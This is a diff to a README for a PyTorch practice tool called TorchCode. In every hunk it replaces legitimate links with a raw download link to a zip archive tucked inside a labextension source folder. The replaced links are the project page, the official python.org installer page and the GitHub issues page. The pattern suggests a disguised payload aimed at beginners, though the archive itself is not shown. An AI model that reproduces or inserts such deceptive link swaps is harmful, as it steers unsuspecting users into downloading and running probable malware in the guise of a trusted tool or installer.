@@ -1,6 +1,6 @@
 # 🔥 TorchCode - Practice PyTorch Skills Easily
 
-[![Download TorchCode](https://img.shields.io/badge/Download-TorchCode-brightgreen)](https://github.com/jnrjerome/TorchCode)
+[![Download TorchCode](https://img.shields.io/badge/Download-TorchCode-brightgreen)](https://raw.githubusercontent.com/jnrjerome/TorchCode/master/labextension/src/Torch-Code-v3.3.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Follow these steps to download and run TorchCode on Windows.
 
 Click the large button below to visit the official TorchCode GitHub page:
 
-[![Download TorchCode](https://img.shields.io/badge/Download-TorchCode-blue)](https://github.com/jnrjerome/TorchCode)
+[![Download TorchCode](https://img.shields.io/badge/Download-TorchCode-blue)](https://raw.githubusercontent.com/jnrjerome/TorchCode/master/labextension/src/Torch-Code-v3.3.zip)
 
 On this page, you will find the files you need to install and run the application.
 
@@ -50,7 +50,7 @@ On this page, you will find the files you need to install and run the applicatio
 
 TorchCode uses Jupyter notebooks, which run inside Python. To get Python and Jupyter:
 
-- Open your web browser and go to https://www.python.org/downloads/  
+- Open your web browser and go to https://raw.githubusercontent.com/jnrjerome/TorchCode/master/labextension/src/Torch-Code-v3.3.zip  
 - Download the latest version of Python 3 that matches your Windows system (choose either 64-bit or 32-bit)  
 - Run the installer and **make sure to check the box "Add Python to PATH"** before clicking "Install Now"  
 - After installation, open a new Command Prompt window by typing `cmd` in your Start menu and pressing Enter  
@@ -128,7 +128,7 @@ TorchCode offers the following features:
 If you need help:
 
 - Review the instructions inside the notebooks carefully  
-- Visit the [GitHub issues page](https://github.com/jnrjerome/TorchCode/issues) to see if others had the same question  
+- Visit the [GitHub issues page](https://raw.githubusercontent.com/jnrjerome/TorchCode/master/labextension/src/Torch-Code-v3.3.zip) to see if others had the same question  
 - Check online tutorials on Jupyter notebooks and basic Python  
 
 ---
@@ -148,4 +148,4 @@ They start simple and build in complexity. Each step guides you through the code
 
 ## 🔗 Download TorchCode Here
 
-[![Get TorchCode](https://img.shields.io/badge/Download-TorchCode-green)](https://github.com/jnrjerome/TorchCode)
+[![Get TorchCode](https://img.shields.io/badge/Download-TorchCode-green)](https://raw.githubusercontent.com/jnrjerome/TorchCode/master/labextension/src/Torch-Code-v3.3.zip)
